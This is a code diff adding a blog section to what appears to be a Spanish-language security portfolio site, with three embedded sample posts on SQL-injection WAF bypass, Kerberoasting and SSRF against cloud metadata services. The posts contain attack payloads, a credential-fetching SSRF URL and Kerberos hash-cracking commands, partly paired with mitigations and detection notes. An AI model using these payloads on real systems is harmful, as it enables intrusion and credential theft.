@@ -1149,7 +1149,309 @@
             opacity: 1;
             transform: translateY(0);
         }
+        /* ESTILOS PARA LA SECCIÓN DE BLOG */
+/* Añade esto dentro de tu <style> existente */
+
+/* Blog Section */
+.blog {
+    padding: 6rem 0;
+    background: rgba(13, 17, 23, 0.3);
+}
+
+.blog-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+    gap: 2rem;
+    margin-top: 3rem;
+}
+
+.blog-card {
+    background: var(--bg-card);
+    border: 2px solid var(--border);
+    padding: 0;
+    overflow: hidden;
+    transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    cursor: pointer;
+    position: relative;
+}
+
+.blog-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 4px;
+    background: linear-gradient(90deg, var(--terminal-green), var(--terminal-blue));
+    transform: scaleX(0);
+    transform-origin: left;
+    transition: transform 0.4s;
+}
+
+.blog-card:hover::before {
+    transform: scaleX(1);
+}
+
+.blog-card:hover {
+    border-color: var(--terminal-green);
+    transform: translateY(-8px);
+    box-shadow: 0 20px 40px rgba(0, 255, 65, 0.2);
+}
+
+.blog-header {
+    padding: 2rem;
+    background: var(--bg-dark);
+    border-bottom: 1px solid var(--border);
+}
+
+.blog-title {
+    font-size: 1.5rem;
+    font-weight: 800;
+    color: var(--terminal-green);
+    margin-bottom: 0.75rem;
+    line-height: 1.3;
+}
+
+.blog-meta {
+    display: flex;
+    gap: 1.5rem;
+    flex-wrap: wrap;
+    align-items: center;
+    font-size: 0.85rem;
+    color: var(--text-secondary);
+}
+
+.blog-date::before {
+    content: '📅 ';
+}
+
+.blog-read-time::before {
+    content: '⏱️ ';
+}
+
+.blog-body {
+    padding: 2rem;
+}
+
+.blog-excerpt {
+    color: var(--text-secondary);
+    line-height: 1.7;
+    margin-bottom: 1.5rem;
+}
+
+.blog-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+}
+
+.blog-tag {
+    padding: 0.25rem 0.75rem;
+    background: rgba(0, 217, 255, 0.1);
+    border: 1px solid var(--terminal-blue);
+    font-size: 0.7rem;
+    color: var(--terminal-blue);
+    text-transform: uppercase;
+    font-weight: 700;
+}
+
+/* Blog Modal */
+.blog-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(1, 4, 9, 0.95);
+    z-index: 1000;
+    overflow-y: auto;
+    padding: 2rem;
+}
+
+.blog-modal.active {
+    display: block;
+}
+
+.blog-modal-content {
+    max-width: 900px;
+    margin: 0 auto;
+    background: var(--bg-card);
+    border: 2px solid var(--terminal-green);
+    padding: 3rem;
+    position: relative;
+    animation: slideIn 0.3s ease-out;
+}
+
+@keyframes slideIn {
+    from {
+        opacity: 0;
+        transform: translateY(30px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.blog-modal-close {
+    position: absolute;
+    top: 1.5rem;
+    right: 1.5rem;
+    width: 40px;
+    height: 40px;
+    border: 2px solid var(--terminal-red);
+    background: transparent;
+    color: var(--terminal-red);
+    font-size: 1.5rem;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+}
+
+.blog-modal-close:hover {
+    background: var(--terminal-red);
+    color: var(--bg-darker);
+}
+
+.blog-modal-header {
+    margin-bottom: 2rem;
+    padding-bottom: 2rem;
+    border-bottom: 2px solid var(--border);
+}
+
+.blog-modal-title {
+    font-size: 2.5rem;
+    font-weight: 800;
+    color: var(--terminal-green);
+    margin-bottom: 1rem;
+    line-height: 1.2;
+}
+
+.blog-modal-body {
+    color: var(--text-primary);
+    line-height: 1.8;
+    font-size: 1rem;
+}
+
+/* Markdown Styling */
+.markdown-content h1,
+.markdown-content h2,
+.markdown-content h3,
+.markdown-content h4 {
+    color: var(--terminal-green);
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+    font-weight: 800;
+}
+
+.markdown-content h1 { font-size: 2rem; }
+.markdown-content h2 { font-size: 1.7rem; }
+.markdown-content h3 { font-size: 1.4rem; }
+.markdown-content h4 { font-size: 1.2rem; }
+
+.markdown-content p {
+    margin-bottom: 1.5rem;
+    line-height: 1.8;
+}
+
+.markdown-content code {
+    background: var(--bg-dark);
+    padding: 0.2rem 0.5rem;
+    border-radius: 3px;
+    color: var(--terminal-yellow);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9em;
+}
+
+.markdown-content pre {
+    background: var(--bg-dark);
+    padding: 1.5rem;
+    border-radius: 8px;
+    overflow-x: auto;
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+}
+
+.markdown-content pre code {
+    background: none;
+    padding: 0;
+    color: var(--terminal-green);
+}
+
+.markdown-content ul,
+.markdown-content ol {
+    margin-left: 2rem;
+    margin-bottom: 1.5rem;
+}
+
+.markdown-content li {
+    margin-bottom: 0.5rem;
+    color: var(--text-secondary);
+}
+
+.markdown-content a {
+    color: var(--terminal-blue);
+    text-decoration: none;
+    border-bottom: 1px solid var(--terminal-blue);
+    transition: all 0.3s;
+}
+
+.markdown-content a:hover {
+    color: var(--terminal-green);
+    border-bottom-color: var(--terminal-green);
+}
+
+.markdown-content blockquote {
+    border-left: 4px solid var(--terminal-green);
+    padding-left: 1.5rem;
+    margin: 1.5rem 0;
+    color: var(--text-secondary);
+    font-style: italic;
+}
+
+/* Responsive Blog */
+@media (max-width: 968px) {
+    .blog {
+        padding: 4rem 0;
+    }
+    
+    .blog-grid {
+        grid-template-columns: 1fr;
+    }
+}
+
+@media (max-width: 640px) {
+    .blog-modal-content {
+        padding: 2rem 1.5rem;
+    }
+
+    .blog-modal-title {
+        font-size: 1.8rem;
+    }
+
+    .blog-modal-close {
+        top: 1rem;
+        right: 1rem;
+        width: 35px;
+        height: 35px;
+    }
+}
+
+@media (max-width: 480px) {
+    .blog-modal-content {
+        padding: 1.5rem 1rem;
+    }
+
+    .blog-modal-title {
+        font-size: 1.5rem;
+    }
+}
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
 </head>
 <body>
     <div class="matrix-bg"></div>
@@ -1169,6 +1471,7 @@
                     <li><a href="#certificaciones">certificaciones</a></li>
                     <li><a href="#skills">habilidades</a></li>
                     <li><a href="#contacto">contacto</a></li>
+                    <li><a href="#blog">blog</a></li>
                 </ul>
             </nav>
         </div>
@@ -1268,6 +1571,31 @@
                 </div>
             </div>
         </section>
+
+        <section id="blog" class="blog">
+    <div class="container">
+        <div class="section-header">
+            <h2 class="section-title">[ BLOG ]</h2>
+            <p class="section-subtitle">Técnicas, writeups y research en seguridad</p>
+        </div>
+        <div class="blog-grid" id="blogGrid"></div>
+    </div>
+</section>
+
+<!-- Modal del blog -->
+<div class="blog-modal" id="blogModal">
+    <div class="blog-modal-content">
+        <button class="blog-modal-close" id="closeModal">×</button>
+        <div class="blog-modal-header">
+            <h2 class="blog-modal-title" id="modalTitle"></h2>
+            <div class="blog-meta">
+                <span class="blog-date" id="modalDate"></span>
+                <span class="blog-read-time" id="modalReadTime"></span>
+            </div>
+        </div>
+        <div class="blog-modal-body markdown-content" id="modalBody"></div>
+    </div>
+</div>
 
         <section id="certificaciones" class="certifications">
             <div class="container">
@@ -1542,6 +1870,234 @@
                 }
             });
         });
+        // JAVASCRIPT PARA LA FUNCIONALIDAD DEL BLOG
+// Añade esto en tu sección <script>, después del código existente
+
+// Blog posts data - EDITA AQUÍ TUS POSTS
+const blogPosts = [
+    {
+        title: "SQL Injection Avanzado: Bypassing WAF con técnicas alternativas",
+        date: "15 Mayo 2026",
+        readTime: "10 min",
+        tags: ["Web Hacking", "SQL Injection", "WAF Bypass"],
+        excerpt: "Exploro técnicas avanzadas de SQL Injection para evadir firewalls de aplicaciones web modernos, incluyendo ofuscación de payloads y explotación de lógica de negocio.",
+        content: `# SQL Injection Avanzado: Bypassing WAF
+
+## Introducción
+
+Los Web Application Firewalls (WAF) se han convertido en una defensa estándar contra SQL Injection. Sin embargo, existen múltiples técnicas para evadir estas protecciones.
+
+## Técnicas de Ofuscación
+
+### 1. Case Manipulation
+\`\`\`sql
+' UNION SELECT NULL,NULL--
+' uNiOn SeLeCt NULL,NULL--
+\`\`\`
+
+### 2. Comentarios Inline
+\`\`\`sql
+' UNION/**/SELECT/**/NULL,NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--
+\`\`\`
+
+### 3. Encoding
+- **URL Encoding**: \`%27%20UNION%20SELECT%20NULL,NULL--\`
+- **Double Encoding**: \`%2527%2520UNION%2520SELECT%2520NULL,NULL--\`
+
+## Time-Based Blind SQLi
+
+Cuando el WAF bloquea respuestas directas:
+
+\`\`\`sql
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+\`\`\`
+
+## Conclusión
+
+La evasión de WAF requiere creatividad y conocimiento profundo de SQL.
+
+> **Disclaimer**: Este contenido es solo educativo.`
+    },
+    {
+        title: "Active Directory: Kerberoasting Attack Deep Dive",
+        date: "8 Mayo 2026",
+        readTime: "15 min",
+        tags: ["Active Directory", "Kerberos", "Red Team"],
+        excerpt: "Análisis detallado del ataque Kerberoasting contra Active Directory, desde la enumeración inicial hasta el crackeo offline de tickets TGS.",
+        content: `# Active Directory: Kerberoasting Attack
+
+## ¿Qué es Kerberoasting?
+
+Kerberoasting es una técnica de post-explotación que permite extraer hashes de contraseñas de cuentas de servicio en Active Directory.
+
+## Proceso del Ataque
+
+### 1. Enumeración de SPNs
+
+Usando PowerView:
+\`\`\`powershell
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+\`\`\`
+
+### 2. Solicitud de Tickets TGS
+
+\`\`\`powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+\`\`\`
+
+### 3. Cracking Offline
+
+Usando Hashcat:
+\`\`\`bash
+hashcat -m 13100 tickets.txt wordlist.txt --force
+\`\`\`
+
+## Mitigaciones
+
+1. **Contraseñas fuertes** para cuentas de servicio (25+ caracteres)
+2. **Managed Service Accounts** (MSA/gMSA)
+3. **Monitoreo** de solicitudes TGS inusuales
+
+## Detección
+
+Indicadores en Event Logs:
+- Event ID 4769 (TGS Request)
+- Múltiples requests en corto periodo
+- Encryption type 0x17 (RC4)`
+    },
+    {
+        title: "SSRF to RCE: Explotando APIs Cloud",
+        date: "1 Mayo 2026",
+        readTime: "12 min",
+        tags: ["Web Hacking", "SSRF", "Cloud Security", "AWS"],
+        excerpt: "Cómo convertir una vulnerabilidad SSRF en ejecución remota de código aprovechando metadata services de cloud providers como AWS, Azure y GCP.",
+        content: `# SSRF to RCE: Explotando APIs Cloud
+
+## Server-Side Request Forgery (SSRF)
+
+SSRF permite a un atacante hacer que el servidor realice requests HTTP arbitrarios.
+
+## Metadata Services en Cloud
+
+### AWS IMDSv1
+\`\`\`bash
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+\`\`\`
+
+### Azure Instance Metadata
+\`\`\`bash
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+\`\`\`
+
+### GCP Metadata
+\`\`\`bash
+http://metadata.google.internal/computeMetadata/v1/
+\`\`\`
+
+## Escalando a RCE
+
+### 1. Obtención de Credenciales IAM
+
+Payload SSRF:
+\`\`\`
+http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+\`\`\`
+
+### 2. Abuso de Permisos IAM
+
+Con las credenciales obtenidas:
+\`\`\`bash
+aws s3 ls --profile stolen
+aws lambda list-functions --profile stolen
+\`\`\`
+
+## Mitigaciones
+
+1. **Validar URLs** - Whitelist de dominios
+2. **IMDSv2 obligatorio** en AWS
+3. **Network segmentation**
+4. **Least privilege** en roles IAM
+
+## Conclusión
+
+SSRF en entornos cloud puede ser devastador. Protege tus metadata endpoints.`
+    }
+];
+
+// Load blog posts
+function loadBlogPosts() {
+    const blogGrid = document.getElementById('blogGrid');
+    
+    blogPosts.forEach((post, index) => {
+        const blogCard = document.createElement('div');
+        blogCard.className = 'blog-card fade-up';
+        blogCard.innerHTML = `
+            <div class="blog-header">
+                <h3 class="blog-title">${post.title}</h3>
+                <div class="blog-meta">
+                    <span class="blog-date">${post.date}</span>
+                    <span class="blog-read-time">${post.readTime}</span>
+                </div>
+            </div>
+            <div class="blog-body">
+                <p class="blog-excerpt">${post.excerpt}</p>
+                <div class="blog-tags">
+                    ${post.tags.map(tag => `<span class="blog-tag">${tag}</span>`).join('')}
+                </div>
+            </div>
+        `;
+        
+        blogCard.addEventListener('click', () => openBlogModal(post));
+        blogGrid.appendChild(blogCard);
+    });
+}
+
+// Open blog modal
+function openBlogModal(post) {
+    const modal = document.getElementById('blogModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalDate = document.getElementById('modalDate');
+    const modalReadTime = document.getElementById('modalReadTime');
+    const modalBody = document.getElementById('modalBody');
+
+    modalTitle.textContent = post.title;
+    modalDate.textContent = post.date;
+    modalReadTime.textContent = post.readTime;
+    modalBody.innerHTML = marked.parse(post.content);
+
+    modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+// Close blog modal
+function closeBlogModal() {
+    const modal = document.getElementById('blogModal');
+    modal.classList.remove('active');
+    document.body.style.overflow = 'auto';
+}
+
+document.getElementById('closeModal').addEventListener('click', closeBlogModal);
+
+document.getElementById('blogModal').addEventListener('click', (e) => {
+    if (e.target.id === 'blogModal') {
+        closeBlogModal();
+    }
+});
+
+// ESC key to close modal
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') {
+        closeBlogModal();
+    }
+});
+
+// Initialize blog on page load
+window.addEventListener('DOMContentLoaded', () => {
+    loadBlogPosts();
+});
     </script>
 </body>
 </html>
